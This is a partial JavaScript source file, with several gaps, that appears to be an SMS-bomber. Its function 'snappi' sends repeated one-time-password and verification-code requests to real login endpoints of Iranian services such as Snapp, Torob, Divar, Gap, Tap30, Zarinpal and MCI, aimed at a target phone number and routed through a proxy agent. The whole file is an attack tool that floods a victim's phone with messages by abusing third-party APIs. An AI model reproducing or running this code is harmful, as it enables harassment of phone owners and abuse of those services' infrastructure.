...
function snappi(x,i){
	...
	axios({
		...
		const p1 = new Promise(() => { axios.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {
			"cellphone": x
		...
		const p2 = new Promise(() => { axios.post('https://messengerg2c51.iranlms.ir/', {
		...
		const p3 = new Promise(() => { axios.get('https://api.torob.com/a/phone/send-pin/?phone_number='+x.replace("+98","0"),{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
			.catch(error => {
				console.log("failed torob"+i.toString()+error.toString())
			})
		});
		
		const p4 = new Promise(() => { axios.post('https://shadmessenger66.iranlms.ir/', {
			"api_version": "3", "method": "sendCode", "data": {"phone_number": x.replace("+98","98"), "send_type": "SMS"}
		},{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
		...
		const p5 = new Promise(() => { axios.post('https://api.divar.ir/v5/auth/authenticate', {
		...
		const p6 = new Promise(() => { axios.get('https://core.gap.im/v1/user/add.json?mobile='+x.replace("+98","%2B98"),{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
			.catch(error => {
				console.log("failed gap"+i.toString()+error.toString())
			})
		});
		
		const p7 = new Promise(() => { axios.post('https://tap33.me/api/v2/user',
		...
		const p8 = new Promise(() => { axios.post('https://api.zarinplus.com/user/zarinpal-login', {
		...
		const p9 = new Promise(() => { axios.post('https://api-ebcom.mci.ir/services/auth/v1.0/otp', {
